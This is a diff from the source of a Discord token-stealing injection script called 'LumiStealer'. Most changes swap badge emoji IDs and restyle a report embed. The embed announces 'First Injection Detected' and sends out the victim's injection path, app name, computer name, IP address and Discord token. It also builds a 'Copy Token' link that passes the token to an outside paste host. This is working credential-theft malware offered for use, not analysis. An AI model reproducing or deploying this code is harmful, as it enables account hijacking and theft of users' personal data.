@@ -74,11 +74,11 @@ const getURL = async (url, token) => {
 
 const GetBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:666_hackingmyshit:1107319657603551253> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:3743staffbadge:1248021364732989441> "), 2 == (2 & e) && (n += "<:5450partneredserver:1248021377290862612> "), 4 == (4 & e) && (n += "<:9472hypesquadeventsbadge:1248021419619647501> "), 8 == (8 & e) && (n += "<:8084iconbughunter:1249771650375876739> "), 64 == (64 & e) && (n += "<:7878iconhypesquadbravery:1249771646189834373> "), 128 == (128 & e) && (n += "<:6318iconhypesquadbrilliance:1249771644713701396> "), 256 == (256 & e) && (n += "<:1033balancedhypesquad:1248021349394415647> "), 512 == (512 & e) && (n += "<:3743earlysupporterbadge:1248021361796976691> "), 16384 == (16384 & e) && (n += "<:5592bugbusterbadge:1248021388028153856> "), 4194304 == (4194304 & e) && (n += "<:1207iconactivedeveloper:1249771641035034745> "), 131072 == (131072 & e) && (n += "<:1207iconearlybotdeveloper:1249771657267122336> "), "" == n && (n = ":x:"), n
 }
 const GetRBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:5450partneredserver:1248021377290862612> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
 }
 
 const GetNSFW = (bouki) => {
@@ -271,38 +271,38 @@ async function initOne() {
   var client_discord = appName;
 
   const embed = {
-    title: 'First Injection Detected - LumiStealer',
+    title: '<:r_diabinho_Angelz:1007886402186391583> First Injection Detected - LumiStealer',
     color: 0x5a0998,
     fields: [
-      {
-        name: "Injection Path:",
-        value: "`"+__dirname+"`",
-        inline: false
-      },
-      {
-        name: "Client:",
-        value: "`"+appName+"`",
-        inline: true
-      },
-      {
-        name: "Computer Name:",
-        value: "`"+computerName+"`",
-        inline: true
-      },
-      {
-        name: "IP:",
-        value: "`"+ip+"`",
-        inline: true
-      },
-      {
-        name: "Token:",
-        value: "`"+token+"`\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
-        inline: false
-      },
+        {
+            name: "Injection Path:",
+            value: "`" + __dirname + "`",
+            inline: false
+        },
+        {
+            name: "Infected App:",
+            value: "<:c_nitro:1249820987403407381> `" + appName + "`",
+            inline: true
+        },
+        {
+            name: "Computer Name:",
+            value: "<:emoji_54:1249821065236975686> `" + computerName + "`",
+            inline: true
+        },
+        {
+            name: "IP:",
+            value: "<:r_purple19_emoji:1247251239255670905> `" + ip + "`",
+            inline: true
+        },
+        {
+            name: "Token:",
+            value: "<:Designsemnome:1249821084111470683> `" + token + "`\n[Copy Token](https://paste-pgpj.onrender.com/?p=" + token + ")",
+            inline: false
+        },
     ],
-    "author": {
-      name: user.username+"#0000 - LumiStealer",
-      icon_url: avatar,
+    author: {
+        name: user.username + "#0000 - LumiStealer",
+        icon_url: avatar,
     },
     footer: {
         icon_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png",
